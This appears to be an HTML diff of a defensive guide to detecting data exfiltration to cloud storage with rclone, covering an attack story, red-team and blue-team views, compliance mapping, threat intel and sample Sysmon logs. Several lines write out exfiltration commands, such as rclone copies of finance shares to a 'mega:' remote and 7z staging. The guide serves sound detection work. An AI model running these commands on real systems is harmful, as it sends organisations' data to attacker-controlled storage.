+        <h4 class="block-title">The full written story (text alternative to the canvas)</h4>
+        <p>Each step below lists what the attacker does, what the defender could see at that moment, and the evidence the story leaves behind. The node meanings are the same as above. The <strong>Attacker</strong> runs the operation, <strong>FS01</strong> holds the data, and the <strong>Cloud</strong> node is the attacker&rsquo;s Mega account. The <strong>SOC</strong> watches telemetry from EDR, the web proxy, and a CASB.</p>
+        <ol>
+          <li><strong>Step 1 · Quiet before the storm.</strong> FS01 was compromised days earlier through a stolen VPN account for a backup vendor; a scheduled-task implant is active but idle. The attacker only beacons gently to blend in. <em>What the defender sees:</em> almost nothing in the moment &mdash; the only clue is one odd VPN login from a new country weeks ago, closed as a false positive. <em>Evidence:</em> VPN login from a new ASN (autonomous system number, the network&rsquo;s identifier); one new scheduled task on FS01.</li>
+          <li><strong>Step 2 · Shopping for data.</strong> From the implant, the attacker sweeps the shares: <code>dir /s</code> walks over finance, HR and R&amp;D folders to build a target list. <em>What the defender sees:</em> the EDR records a burst of around 1,400 directory listings in twelve minutes &mdash; at 03:00 local time, from a server that normally only serves files. <em>Evidence:</em> EDR process lines full of <code>dir</code> sweeps; off-hours share enumeration.</li>
+          <li><strong>Step 3 · Packing with a password.</strong> The attacker compresses the chosen shares into one archive: <code>7z a -p&lt;hard-pass&gt; C:\Windows\Temp\arc.7z \\FS01\finance</code> (shown for lab practice only). A single password-protected file is far easier to upload than ten thousand small ones. <em>What the defender sees:</em> <code>7z.exe</code> runs on a server for the first time ever, and a temp file starts growing toward gigabytes. <em>Evidence:</em> 7z first-seen on FS01; <code>arc.7z</code> growing in <code>C:\Windows\Temp</code>.</li>
+          <li><strong>Step 4 · The remote config appears.</strong> rclone is staged and configured: <code>rclone config</code> writes a remote named <code>mega:</code> into <code>%APPDATA%\rclone\rclone.conf</code>, holding the attacker&rsquo;s cloud credentials. <em>What the defender sees:</em> a Sysmon (Microsoft&rsquo;s system-monitoring agent) Event ID 11 file-create for <code>rclone.conf</code> &mdash; a filename that has never appeared anywhere in the estate &mdash; and the first execution of <code>rclone.exe</code> on record. <em>Evidence:</em> Sysmon 11 create of rclone.conf; rclone.exe never seen before.</li>
+          <li><strong>Step 5 · The upload.</strong> The main event: <code>rclone copy C:\Windows\Temp mega:corp-backup</code> pushes tens of gigabytes out, split across parallel TLS connections and shaped with <code>--bwlimit</code> to stay polite. <em>What the defender sees:</em> the proxy&rsquo;s per-host upload bytes explode to about 50× the 30-day baseline for FS01, and the CASB flags an unmanaged cloud-storage app. This alert is the real warning window. <em>Evidence:</em> proxy bytes-up baseline break; CASB unmanaged-app event on mega.nz.</li>
+          <li><strong>Step 6 · Cleaning up.</strong> The attacker deletes <code>arc.7z</code>, wipes the staging folder, and touches a few file timestamps to confuse later review. <em>What the defender sees:</em> update sequence number (USN) journal delete records for the archive, and the EDR flags a mismatch between the <code>$STANDARD_INFORMATION</code> and <code>$FILE_NAME</code> timestamps &mdash; a classic timestomping hint. <em>Evidence:</em> USN delete of arc.7z; EDR timestamp-mismatch flag.</li>
+          <li><strong>Step 7 · Attacker downloads.</strong> On their own infrastructure, the attacker pulls the archive from Mega to keep a local copy. <em>What the defender sees:</em> nothing on the corporate side &mdash; the download happens entirely inside the cloud provider, between the attacker&rsquo;s account and their devices. This is why cloud storage feels safe to attackers and why the earlier steps matter more. <em>Evidence:</em> no on-prem telemetry; provider account is attacker-controlled.</li>
+          <li><strong>Step 8 · Encryption follows.</strong> With the data safely copied, the attacker runs the ransomware: shares get encrypted, a note appears, and the extortion email quotes samples of the stolen files. <em>What the defender sees:</em> the SOC replay now shows the whole chain &mdash; and the rclone alert fired roughly six hours before the first encryption event. That gap was the warning window; this page exists to make sure it is never missed again. <em>Evidence:</em> encryption events (late); rclone alert timeline showing a ~6-hour lead.</li>
+        </ol>
+        <div class="callout note">
+          <span class="callout-label">Note · How to read the story</span>
+          <p>Notice the pattern across steps: the attacker&rsquo;s most visible actions (steps 3&ndash;5) all happen on <em>your</em> side of the cloud boundary. Step 7 is invisible to you. Defenders win by alerting on steps 2&ndash;5 &mdash; before the cloud swallows the evidence.</p>
+        </div>
+      </section>
+      <section id="sec-3-red-team" class="content-section">
+        <div class="section-head">
+          <span class="section-num">3</span>
+          <h2>Red Team Perspective: How Attackers Abuse Cloud Storage</h2>
+          <p class="section-intro">Why operators pick cloud storage, what they need in place, and how the move looks from their side. All commands here are lab-only demonstrations.</p>
+        </div>
+        <h4 class="block-title">Why this technique is so attractive</h4>
+        <p>An operator choosing an exfiltration channel compares speed, cover, and cost. Cloud storage wins on all three. Accounts on consumer providers are free or cheap, and a single rclone process can saturate a link with parallel transfers. The traffic is TLS from end to end, so it hides among the same domains real employees use every day. And rclone speaks more than forty providers with one configuration file, so the same playbook works whether the attacker picked Mega, Google Drive, or their own S3 bucket this morning. For ransomware crews the math is even better: copying the data first doubles the leverage, because they can threaten both publication and encryption.</p>
+        <h4 class="block-title">When and where attackers use it</h4>
+        <p>Timing clusters around two windows. Ransomware crews run the upload in the final hours before encryption, often overnight, when volume alerts are staffed thin. Espionage and theft crews prefer long, low-volume transfers spread across days. Place matters too. The tool runs where the data already sits: file servers, admin workstations, and backup hosts. The destination is whatever provider the victim&rsquo;s proxy does not block &mdash; consumer storage or attacker-owned S3 and Blob accounts.</p>
+        <h4 class="block-title">Prerequisites</h4>
+        <ul>
+          <li><strong>Network egress</strong> to the chosen provider (or to any provider that is not category-blocked at the proxy).</li>
+          <li><strong>Data access</strong> &mdash; the collected file list from the earlier chain stages, ideally on a host that already touches the shares, such as a file server or an admin workstation.</li>
+          <li><strong>Storage credentials</strong> &mdash; an account on the provider, an access key, or a SAS (shared access signature) token. Public reporting shows actors pre-create these accounts before the operation starts.</li>
+          <li><strong>A staging step</strong> &mdash; usually one archive file (7z, zip, tar) so thousands of small files become one upload.</li>
+        </ul>
+        <h4 class="block-title">A safe lab walk-through</h4>
+        <p>The sequence below reproduces the full chain safely. It uses a local S3 emulator (MinIO) running on your own machine and dummy files you created yourself. Nothing leaves your computer, and the resulting logs are perfect practice data for the detections in section 5.</p>
+        <div class="callout warning">
+          <span class="callout-label">⚠ LAB-ONLY · Run against systems you own.</span>
+          <p>Example lab commands (your own VM only):</p>
+          <p><code>rclone config</code> &mdash; create a remote named <code>lab:</code> pointing at <code>http://127.0.0.1:9000</code> (MinIO) with access keys you generated for the lab.</p>
+          <p><code>rclone lsd lab:</code> &mdash; list the buckets to prove the channel works.</p>
+          <p><code>rclone copy C:\lab\dummy-data lab:dummy-bucket --transfers 4 --bwlimit 1M</code> &mdash; upload dummy files slowly, exactly like a real operator would shape traffic.</p>
+          <p><code>7z a -pLabPass123 C:\lab\arc.7z C:\lab\dummy-data</code> &mdash; show how staging into one archive looks before an upload.</p>
+        </div>
+        <p>While you run these, open a second terminal and watch what defenders would watch. Look for the process creation line (Sysmon Event ID 1) and the config file creation (Event ID 11). If you point the lab at a real provider with your own account, also check the proxy entry for its user agent and byte counts. This pairing is the heart of detection engineering for this technique.</p>
+        <h4 class="block-title">Common variations</h4>
+        <ul>
+          <li><strong>azcopy to an attacker-owned Azure Blob</strong> &mdash; a single Microsoft-signed binary and a SAS URL; looks like routine Azure admin work.</li>
+          <li><strong>aws s3 cp to attacker S3</strong> &mdash; common where AWS CLI already exists on the host.</li>
+          <li><strong>MEGAcmd / megasync</strong> &mdash; the MEGA route documented in the ATT&amp;CK C0015 campaign.</li>
+          <li><strong>Native sync clients</strong> &mdash; drop files into a folder the Dropbox/OneDrive client syncs; the official app does the exfiltration.</li>
+          <li><strong>Malicious OAuth apps</strong> &mdash; OAuth is the open standard for app authorization. These attacks need no binary: the victim consents to an app that then reads the cloud drive through the provider&rsquo;s API (application programming interface).</li>
+        </ul>
+        <h4 class="block-title">Mistakes attackers make (and you should hunt for)</h4>
+        <p>Operators slip in three predictable ways, and each slip is an easy detection for you. The <strong>default rclone user agent</strong> (<code>rclone/v1.x</code>) is a clean proxy-side signature. <strong>Uploading during business hours</strong> or in one flat, multi-hour burst breaks volume baselines far more than a shaped trickle would. And <strong>reusing the same storage account across victims</strong> means one intel report or one CASB watchlist entry can unmask the whole campaign. Section 5.5 turns each of these into a working rule.</p>
+      </section>
+      <section id="sec-4-blue-team" class="content-section">
+        <div class="section-head">
+          <span class="section-num">4</span>
+          <h2>Blue Team Perspective: What Defenders See</h2>
+          <p class="section-intro">The artifacts this technique leaves behind, where to look first, and a short triage flow for the morning an alert fires.</p>
+        </div>
+        <p>From the defender&rsquo;s chair, exfiltration to cloud storage is unusually generous with artifacts &mdash; but only if you collect them. Every stage of the story in section 2 writes a line somewhere: process telemetry, file events, proxy records, CASB events, DNS queries, and identity logs. The catch is that each single line looks harmless. A defensible detection program is about <em>joining</em> them: a first-seen tool, plus a config file, plus a volume break, equals an incident.</p>
+        <h4 class="block-title">Artifacts to collect and keep</h4>
+        <ul>
+          <li><strong>Sysmon Event ID 1</strong> &mdash; process creation lines for <code>rclone.exe</code>, <code>azcopy.exe</code>, <code>megasync.exe</code>, <code>aws.exe</code> and <code>curl.exe</code>, with command lines, hashes and parents.</li>
+          <li><strong>Sysmon Event ID 11</strong> &mdash; creation of <code>rclone.conf</code>, staging archives like <code>*.7z</code> in temp folders, and dropped binaries.</li>
+          <li><strong>Proxy / SWG logs</strong> &mdash; a secure web gateway (SWG) records the destination host, URL category, user agent, method, and especially <em>bytes uploaded</em> per host and per user.</li>
+          <li><strong>CASB events</strong> &mdash; unmanaged-app usage, per-user cloud-storage volume, file activities, and OAuth app grants.</li>
+          <li><strong>DNS / SNI telemetry</strong> &mdash; the domain name system (DNS) lookups and server name indication (SNI) values. Watch for <code>mega.nz</code>, <code>storage.googleapis.com</code>, <code>*.blob.core.windows.net</code>, S3 endpoints, from hosts that should never talk to them.</li>
+          <li><strong>Identity logs</strong> &mdash; Azure AD / Okta OAuth consent events, app assignments, service-principal changes, and sign-ins for the accounts used.</li>
+          <li><strong>DLP alerts</strong> &mdash; data loss prevention (DLP) content matches inside uploads, useful to upgrade an anomaly into a confirmed data-loss case.</li>
+        </ul>
+        <div class="callout note">
+          <span class="callout-label">Note · Where it fits the chain</span>
+          <p>This technique is the last domino. It follows collection (T1114 mail, T1005 files, T1213 documents) and usually precedes Impact (T1486 ransomware, T1487 account access removal). An exfil alert is therefore not &ldquo;one weird event&rdquo; &mdash; it is a statement that earlier stages already succeeded. Treat it with incident priority, not triage-priority.</p>
+        </div>
+        <h4 class="block-title">Triage flow when the alert fires</h4>
+        <ol>
+          <li><strong>Confirm tool first-seen.</strong> Is this the first run of rclone/azcopy/megasync on this host in your whole retention window? If yes, the case is already strong.</li>
+          <li><strong>Find the config.</strong> Look for <code>rclone.conf</code> (or a <code>--config</code> flag in the command line) and read the remote it defines: provider, account, bucket name.</li>
+          <li><strong>Measure the volume.</strong> Pull the proxy/CASB numbers for the last 24&ndash;48 hours and compare with the 30-day baseline for that host and user.</li>
+          <li><strong>Identify the destination.</strong> Which provider, which exact bucket, is it on any allowlist, and is the account known to the business?</li>
+          <li><strong>Trace the grant origin.</strong> For OAuth cases: who consented, when, from which IP, and what scopes were granted?</li>
+          <li><strong>Contain the egress.</strong> Block the flow at the proxy or firewall mid-transfer if possible; isolate the host if the tooling re-runs from persistence.</li>
+          <li><strong>Rotate and hunt.</strong> Revoke tokens and keys in the config, reset involved accounts, then hunt estate-wide for the same config filename, hash, and user agent.</li>
+        </ol>
+        <div class="callout practice">
+          <span class="callout-label">Good practice · Log the bytes</span>
+          <p>If your proxy or firewall can log upload bytes per connection, turn that on today. Almost every high-value detection in section 5.5 becomes easier &mdash; and far less false-positive-prone &mdash; when volume is part of the record. Without bytes, you are hunting with a destination list alone.</p>
+        </div>
+      </section>
+      <section id="sec-5-detection" class="content-section">
+        <div class="section-head">
+          <span class="section-num">5</span>
+          <h2>Detection Engineering Deep Dive</h2>
+          <p class="section-intro">The practical core of this guide: regulation hooks, threat intelligence, ranked threats, the exact logs to collect, and copy-ready Sigma and Splunk rules for each scenario.</p>
+        </div>
+        <p>Detection for cloud-storage exfiltration is a volume-and-identity problem. No single log line says &ldquo;data theft&rdquo;. Instead you stack weak signals: a first-seen upload tool, a new config file, a baseline break on upload bytes, an unfamiliar OAuth grant. This section gives you every layer: the compliance reasons to fund the work (5.1), the intel that shows who does this (5.2), and the scenarios worth detecting (5.3). It continues with the logs and patterns that expose them (5.4) and ready-to-adapt rules (5.5).</p>
+
+        <h3 id="sec-5-1-regulation" class="sec-sub"><span class="sub-id">5.1</span> Regulation Mapping</h3>
+        <p>Exfiltration is not only a security failure &mdash; it is usually a compliance failure with legal clocks attached. When personal data, health records, or payment card data end up in an attacker&rsquo;s cloud bucket, several frameworks expect you to have prevented, detected, and reported exactly this. Those frameworks are the EU General Data Protection Regulation (GDPR), the Health Insurance Portability and Accountability Act (HIPAA), the international standard ISO/IEC 27001:2022, SOC 2 (an audit framework built on the Trust Services Criteria, TSC), the Payment Card Industry Data Security Standard (PCI DSS), and the U.S. National Institute of Standards and Technology (NIST) publications. The table below maps the most relevant controls to this technique, with the concrete evidence an auditor will ask for. Rows with a shaded background are the ones most directly tied to cloud-storage exfiltration: they expect demonstrable monitoring of data movement and proven breach detection.</p>
+        <div class="table-wrap">
+          <table>
+            <thead>
+              <tr><th>Framework</th><th>Control</th><th>Why it applies here</th><th>Expected evidence</th></tr>
+            </thead>
+            <tbody>
+              <tr class="row-emph">
+                <td>GDPR</td><td class="mono">Art. 32(1) — security of processing</td>
+                <td>Data leaving to attacker storage shows processing was not secured against unlawful disclosure.</td>
+                <td>DLP and egress-control configs, exfil detection rules, risk assessment covering cloud uploads.</td>
+              </tr>
+              <tr>
+                <td>GDPR</td><td class="mono">Art. 5(1)(f) — integrity &amp; confidentiality</td>
+                <td>Personal data must stay confidential; bulk upload to Mega violates it.</td>
+                <td>Access reviews, encryption policies, transfer-monitoring reports.</td>
+              </tr>
+              <tr class="row-emph">
+                <td>GDPR</td><td class="mono">Art. 33 / 34 — breach notification</td>
+                <td>A confirmed exfil starts the 72-hour regulator clock and possibly data-subject notice.</td>
+                <td>Incident tickets, detection-to-notification timeline, regulator correspondence.</td>
+              </tr>
+              <tr>
+                <td>HIPAA Security Rule</td><td class="mono">164.308(a)(1)(ii)(D) — information-system activity review</td>
+                <td>Requires regular review of system activity — e.g., proxy upload baselines.</td>
+                <td>Log-review schedules, baseline reports, alert tickets.</td>
+              </tr>
+              <tr class="row-emph">
+                <td>HIPAA Security Rule</td><td class="mono">164.312(b) — audit controls</td>
+                <td>Systems handling ePHI (electronic protected health information) must record and examine activity; exfil detection depends on it.</td>
+                <td>Sysmon/proxy/CASB logging enabled on ePHI systems; retention proof.</td>
+              </tr>
+              <tr>
+                <td>HIPAA Security Rule</td><td class="mono">164.312(e) — transmission security</td>
+                <td>Guards ePHI in transit, including unauthorized uploads to external services.</td>
+                <td>Proxy category policy, TLS inspection decisions, ePHI DLP rules.</td>
+              </tr>
+              <tr>
+                <td>HIPAA Security Rule</td><td class="mono">164.310(d) — device &amp; media controls</td>
+                <td>Covers movement of media — relevant when staging archives before upload.</td>
+                <td>Device-control config, media-inventory procedures.</td>
+              </tr>
+              <tr class="row-emph">
+                <td>ISO/IEC 27001:2022</td><td class="mono">A.8.12 — data leakage prevention</td>
+                <td>Directly names DLP for data leaving the org — the core of this technique.</td>
+                <td>DLP rule exports, blocked-upload samples, tuning history.</td>
+              </tr>
+              <tr>
+                <td>ISO/IEC 27001:2022</td><td class="mono">A.5.14 — information transfer</td>
+                <td>Transfers (including to cloud) need agreements and controls.</td>
+                <td>Approved-provider list, transfer policy, exception register.</td>
+              </tr>
+              <tr>
+                <td>ISO/IEC 27001:2022</td><td class="mono">A.7.9 / A.8.1 — assets off-premises; endpoint devices</td>
+                <td>Data on laptops and off-site assets must be protected — sync clients included.</td>
+                <td>Endpoint policy, mobile device management (MDM)/CASB coverage reports.</td>
+              </tr>
+              <tr class="row-emph">
+                <td>ISO/IEC 27001:2022</td><td class="mono">A.8.16 — monitoring activities</td>
+                <td>Requires monitoring for anomalous behavior — first-seen tooling, volume breaks.</td>
+                <td>SOC alert catalog, monitoring coverage matrix, detection tests.</td>
+              </tr>
+              <tr>
+                <td>SOC 2 (TSC)</td><td class="mono">CC6.1 — logical access</td>
+                <td>Exfil needs stolen or misused credentials; access control is the upstream fix.</td>
+                <td>Access reviews, MFA coverage, credential-rotation records.</td>
+              </tr>
+              <tr class="row-emph">
+                <td>SOC 2 (TSC)</td><td class="mono">CC6.7 — restrict movement / transmission of data</td>
+                <td>Names exactly this technique: controlling where data may move.</td>
+                <td>Egress policy, category blocks, OAuth governance records.</td>
+              </tr>
+              <tr>
+                <td>SOC 2 (TSC)</td><td class="mono">CC7.2 / CC7.3 — monitoring; incident evaluation</td>
+                <td>Anomalies must be detected and assessed — the rclone alert path.</td>
+                <td>Alert tickets, triage notes, post-incident reviews.</td>
+              </tr>
+              <tr class="row-emph">
+                <td>PCI DSS v4.0</td><td class="mono">Req. 12.3.x — acceptable-use &amp; media policy (verify current sub-numbering)</td>
+                <td>Requires policy on technology use — including cloud storage and uploads of cardholder data.</td>
+                <td>Signed acceptable-use policy, targeted-risk analyses for storage services.</td>
+              </tr>
+              <tr>
+                <td>PCI DSS v4.0</td><td class="mono">Req. 4 — protect account data in transit</td>
+                <td>Uploads of files bearing PANs (primary account numbers) to attacker storage break transmission protection.</td>
+                <td>Network DLP rules, segmentation docs, encryption standards.</td>
+              </tr>
+              <tr class="row-emph">
+                <td>NIST SP 800-53 Rev.5</td><td class="mono">SI-4 — system monitoring</td>
+                <td>The home of exfil detection: inbound/outbound communications analysis.</td>
+                <td>Monitoring architecture, detection content, coverage reports.</td>
+              </tr>
+              <tr>
+                <td>NIST SP 800-53 Rev.5</td><td class="mono">AC-4 — information flow enforcement</td>
+                <td>Policy enforcement on where data may flow — proxy and CASB controls.</td>
+                <td>Flow policy matrix, enforcement device configs.</td>
+              </tr>
+              <tr>
+                <td>NIST SP 800-53 Rev.5</td><td class="mono">MP-7 / MP-6 — media use; media sanitization</td>
+                <td>Staging archives and removable media feed this technique.</td>
+                <td>Media-use policy, sanitization records, USB device-control logs.</td>
+              </tr>
+              <tr>
+                <td>NIST Cybersecurity Framework (CSF) 2.0</td><td class="mono">PR.DS — data security; DE.CM — continuous monitoring</td>
+                <td>PR.DS covers protecting data at rest/in transit; DE.CM expects watching for exfil.</td>
+                <td>CSF profile scores, monitoring playbooks, improvement plan.</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+        <div class="callout note">
+          <span class="callout-label">Note · How to use this table</span>
+          <p>Pick the framework your auditors care about, then fund the shared controls underneath: egress logging with bytes, DLP on the proxy, OAuth governance, and first-seen tool alerts. One control set satisfies most rows above &mdash; and it is the same set section 5.5 detects with.</p>
+        </div>
+
+        <h3 id="sec-5-2-intel" class="sec-sub"><span class="sub-id">5.2</span> Threat Intelligence</h3>
+        <p>Threat intel for this technique answers three questions: <em>who</em> exfiltrates to cloud storage, <em>which tools</em> they prefer, and <em>which providers</em> appear in current campaigns. You gather that picture from layered sources, analyze it into your own context, and apply it as detections and watchlists. Keep this cycle running: yesterday&rsquo;s Mega-heavy campaign is today&rsquo;s proxy watchlist entry, and tomorrow&rsquo;s may favor attacker-owned S3 buckets.</p>
+        <h4 class="block-title">Sources worth following</h4>
+        <ul>
+          <li><strong>MITRE ATT&amp;CK site and STIX/TAXII feeds</strong> — STIX/TAXII are the standard formats and transport for machine-readable threat data. The technique page for T1567.002 lists groups, software and campaigns (C0015, Akira, Chimera, Crutch and many more), and the feed lets you sync them into your tools.</li>
+          <li><strong>Vendor blogs</strong> — Microsoft, Mandiant, CrowdStrike, ESET, Kaspersky and Red Canary publish incident write-ups with exact command lines, user agents, and provider names.</li>
+          <li><strong>OSINT communities</strong> — open-source intelligence (OSINT) communities such as abuse.ch, Any.run, malware-traffic-analysis.net and vx-underground share samples and PCAPs where rclone or MEGAcmd traffic is visible in the wild.</li>
+          <li><strong>Commercial feeds</strong> — Recorded Future and VirusTotal track infrastructure, such as the storage accounts reused across victims.</li>
+          <li><strong>ISACs</strong> — information sharing and analysis centers (ISACs) such as MS-ISAC, FS-ISAC, H-ISAC, E-ISAC and ICS-ISAC share sector-relevant campaign notes, often with detections attached.</li>
+          <li><strong>Internal telemetry</strong> — your own past incidents, honeypots and EDR history are the highest-signal feed you own; every former case becomes a baseline and a rule test.</li>
+        </ul>
+        <h4 class="block-title">From collection to application</h4>
+        <p><strong>Collection</strong> is the pull-and-subscribe work above. <strong>Analysis</strong> turns it into decisions: which providers to category-block, which tool hashes and user agents to alert on, which OAuth scopes to forbid. <strong>Application</strong> means the intel lands in controls &mdash; a CASB watchlist entry, a Sigma rule, a purple-team test &mdash; and you measure whether it would have caught your last incident. Intel that never changes a detection is a newsletter, not a capability.</p>
+        <h4 class="block-title">Known actors and campaigns</h4>
+        <div class="table-wrap">
+          <table>
+            <thead>
+              <tr><th>Actor / campaign</th><th>Confidence</th><th>What they did</th><th>Basis</th></tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td>Conti and successor crews</td>
+                <td><span class="badge sev-high">High</span></td>
+                <td>Documented playbook step: rclone (and MEGASync) bulk copy to Mega before the ransomware runs.</td>
+                <td>Leaked playbooks plus multiple incident-response reports.</td>
+              </tr>
+              <tr>
+                <td>GoldenJackal</td>
+                <td><span class="badge sev-high">High</span></td>
+                <td>Exfiltrated files from government networks to Google Drive, using USB relay across air-gapped hosts (see case study, section 6).</td>
+                <td>ESET public reporting, September 2024.</td>
+              </tr>
+              <tr>
+                <td>Akira</td>
+                <td><span class="badge sev-high">High</span></td>
+                <td>Akira (G1024) is listed on the T1567.002 page as a procedure example; public reporting documents its rclone-based bulk exfiltration.</td>
+                <td>MITRE ATT&amp;CK v1.3 procedure examples and vendor reporting.</td>
+              </tr>
+              <tr>
+                <td>LUCR-3 / Scattered Spider-style actors</td>
+                <td><span class="badge sev-medium">Medium</span></td>
+                <td>Abuse of cloud storage, sync tooling and cloud identities for staging and exfil during extortion operations.</td>
+                <td>Multiple vendor reports; specifics vary between cases.</td>
+              </tr>
+              <tr>
+                <td>Actor-agnostic azcopy abuse</td>
+                <td><span class="badge sev-high">High</span></td>
+                <td>Incident responders (Microsoft, Mandiant) repeatedly report azcopy pushes to attacker-owned blob storage.</td>
+                <td>Pattern-level confidence: tool and pattern verified, actor set varies.</td>
+              </tr>
+              <tr>
+                <td>C0015 campaign</td>
+                <td><span class="badge sev-high">High</span></td>
+                <td>Used the exact command <span class="mono">rclone.exe copy --max-age 2y "\\SERVER\Shares" Mega:DATA ... --bwlimit 10M</span> against a victim&rsquo;s shares.</td>
+                <td>Documented in MITRE ATT&amp;CK campaign C0015 with full command line.</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+        <div class="callout note">
+          <span class="callout-label">Note · What confidence means here</span>
+          <p><strong>High</strong> = two or more independent public sources, or primary artifacts (leaked playbooks, captured command lines). <strong>Medium</strong> = consistent single-vendor reporting or partial public detail; treat as planning input, not proof. <strong>Low</strong> = anecdotal or uncorroborated signals; track, but never build controls on it. The rows above contain no Low entries &mdash; that is how well-documented this technique is.</p>
+        </div>
+        <h3 id="sec-5-3-threats" class="sec-sub"><span class="sub-id">5.3</span> Threat Ranking and Categorization</h3>
+        <p>Not every cloud-storage exfil scenario deserves the same budget. The six scenarios below are ranked by how often they appear in real incidents, how much damage they do, and how hard they are to catch. ATT&amp;CK lists the technique&rsquo;s platforms as ESXi, Linux, Windows, and macOS. The badges below group those platforms into practical categories &mdash; host badges (Windows, Linux, macOS) for endpoint scenarios, plus Cloud and Identity for tenant-side paths that never touch a managed host. Each row lists what the threat needs in order to exist (preconditions) and why it earned its severity. These six scenarios drive everything else in this guide: section 5.4 shows the logs for each one, and section 5.5 gives each one a Sigma rule and a Splunk query.</p>
+        <div class="table-wrap">
+          <table>
+            <thead>
+              <tr><th>Severity</th><th>Threat</th><th>Platforms</th><th>Description</th><th>Preconditions</th><th>Impact</th><th>Rating justification</th></tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><span class="badge sev-critical">Critical</span></td>
+                <td><strong>1 · rclone staging and bulk upload before ransomware</strong></td>
+                <td><span class="badge cat-windows">Windows</span> <span class="badge cat-linux">Linux</span></td>
+                <td>Attacker archives shares into one file, then uses rclone to copy it to Mega, Drive or another consumer cloud &mdash; hours before encryption starts.</td>
+                <td>Egress to the provider; a storage account or keys; interactive or admin access to a file server.</td>
+                <td>Mass data loss plus double-extortion leverage; the encryption notice arrives with data already gone.</td>
+                <td>The defining modern pattern: leaked Conti playbooks, ATT&amp;CK C0015 and Akira examples all show it; volume is huge and the window is short.</td>
+              </tr>
+              <tr>
+                <td><span class="badge sev-high">High</span></td>
+                <td><strong>2 · azcopy / aws cli to attacker-owned storage</strong></td>
+                <td><span class="badge cat-windows">Windows</span> <span class="badge cat-linux">Linux</span> <span class="badge cat-cloud">Cloud</span></td>
+                <td>Native cloud CLIs upload data to an attacker blob container or S3 bucket using a SAS token or stolen key.</td>
+                <td>CLI present on host (or downloaded); valid SAS URL or keys; read access to the data.</td>
+                <td>Quiet bulk theft that looks like routine cloud administration on a first-party domain.</td>
+                <td>Frequently reported by incident-response (IR) teams (Microsoft, Mandiant); native tooling defeats naive &ldquo;unknown binary&rdquo; logic.</td>
+              </tr>
+              <tr>
+                <td><span class="badge sev-high">High</span></td>
+                <td><strong>3 · Native sync client abuse (Dropbox / OneDrive / MEGAsync)</strong></td>
+                <td><span class="badge cat-windows">Windows</span> <span class="badge cat-macos">macOS</span></td>
+                <td>An insider or malware drops files into a folder the official sync client uploads &mdash; the vendor app does the exfiltration.</td>
+                <td>Sync client installed and signed in to some account (personal or corporate).</td>
+                <td>Folder-sync exfil with traffic nearly identical to a real user&rsquo;s normal sync.</td>
+                <td>Hard to separate from legitimate sync by destination; needs per-user volume and personal-account visibility (CASB).</td>
+              </tr>
+              <tr>
+                <td><span class="badge sev-high">High</span></td>
+                <td><strong>4 · Malicious OAuth app granted drive access</strong></td>
+                <td><span class="badge cat-cloud">Cloud</span> <span class="badge cat-identity">Identity</span></td>
+                <td>A consent-phishing page gets a user to approve an app that then reads Drive/OneDrive/mail via API at tenant scale.</td>
+                <td>A user with consent rights; a phishing lure; app registration on the provider.</td>
+                <td>Tenant-wide data reach with no endpoint artifact at all.</td>
+                <td>Bypasses every endpoint control; consent grants are under-reviewed in most tenants.</td>
+              </tr>
+              <tr>
+                <td><span class="badge sev-medium">Medium</span></td>
+                <td><strong>5 · RAT / cloud C2 mixing staging and exfil in storage buckets</strong></td>
+                <td><span class="badge cat-windows">Windows</span></td>
+                <td>A RAT (remote access trojan) uses cloud storage as both C2 (command-and-control) channel and exfil target &mdash; beacon-style PUT/GET (upload/download) requests against the same object prefix (BoomBox-style).</td>
+                <td>Initial malware infection; embedded provider credentials in the implant.</td>
+                <td>Dual-use channel that blends with ordinary software-as-a-service (SaaS) noise; smaller but steady data loss.</td>
+                <td>Lower volume than ransomware staging, but long dwell time; periodicity is detectable.</td>
+              </tr>
+              <tr>
+                <td><span class="badge sev-medium">Medium</span></td>
+                <td><strong>6 · Backup tooling repurposed for mass upload</strong></td>
+                <td><span class="badge cat-windows">Windows</span> <span class="badge cat-linux">Linux</span></td>
+                <td>Attacker edits a backup job so the &ldquo;backup&rdquo; now uploads shares to remote storage they control, off-hours.</td>
+                <td>Legit backup software present; access to its console or the scheduler.</td>
+                <td>Huge uploads that alarms read as &ldquo;backups working as configured&rdquo;.</td>
+                <td>Semantic confusion defeats volume alerts; needs job-change and schedule-change detection.</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3 id="sec-5-4-logs" class="sec-sub"><span class="sub-id">5.4</span> Logs and Detection Patterns</h3>
+        <p>For each threat above: the log sources and fields to collect, what normal looks like versus what suspicious looks like, the detection logic in one sentence, and a realistic event example with its fields explained. The examples use JSON (JavaScript Object Notation), XML, or plain log lines. Adapt field names to your actual schema &mdash; the shapes below match common vendor formats.</p>
+
+        <h4 class="block-title"><span class="mono-tag">Threat 1</span> rclone staging and bulk upload before ransomware</h4>
+        <p><strong>Log sources and key fields:</strong> Sysmon Event ID 1 (Image, CommandLine, OriginalFileName, User, ParentImage, Hashes), Sysmon Event ID 11 (TargetFilename, Image, ProcessGuid), and proxy logs (cs_host, c_useragent, sc_bytes/bytes uploaded, cs_method). The command line and the config-file path are the two fields that carry the most signal.</p>
+        <p><strong>Normal:</strong> no rclone processes or config files anywhere; uploads on servers are near zero. <strong>Suspicious:</strong> a first-ever rclone execution, a <code>--config</code> flag pointing outside the standard install path, an archive growing in a temp folder, and a multi-hour HTTPS upload burst. <strong>Detection logic:</strong> alert when rclone runs for the first time on a host, especially alongside a config-file creation and a large upload. That combination appears in almost every pre-encryption case.</p>
+        <div class="code-block">
+          <div class="code-head"><span class="code-title">Sysmon Event ID 1 · rclone first-seen (JSON)</span><button class="copy-btn" type="button">Copy</button></div>
+          <pre><code class="language-json">{
+  "EventTime": "2025-11-18 03:12:44",
+  "Hostname": "FS01.corp.lab",
+  "EventID": 1,
+  "Image": "C:\\Users\\Public\\rclone.exe",
+  "OriginalFileName": "rclone.exe",
+  "CommandLine": "rclone.exe copy \\\\FS01\\finance mega:corp-backup --config C:\\Users\\Public\\rclone.conf --transfers 8 --bwlimit 8M --ignore-existing -q",
+  "User": "CORP\\svc_backup",
+  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+  "Hashes": "SHA256=9F2C4B17E4A2D8C0B6E1F35A77D2C9A4E8B1F06C2D3A4B5C6D7E8F9012A3B4C5"
+}</code></pre>
+        </div>
+        <ul>
